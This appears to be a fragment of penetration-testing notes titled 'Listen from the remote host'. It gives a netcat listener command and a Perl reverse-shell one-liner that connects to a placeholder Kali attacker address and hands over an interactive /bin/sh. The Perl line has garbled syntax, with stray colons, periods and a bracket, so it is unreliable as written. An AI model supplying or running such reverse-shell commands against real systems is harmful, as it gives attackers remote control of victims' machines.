#### Listen from the remote host
```
nc.exe -nlvp 1234
```

```
perl -e 'use Socket; $i="<kaliIP>"; $p=<listnerPort>; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp") ); if(connect(S, sockaddr_in($p, inet_aton($i)))) {open(STDIN. ">&S") : open (STDOUT, ">&S" ) : open (STDERR, ">&S" ) : exec ("/bin/sh -i" ) : ]: '
```

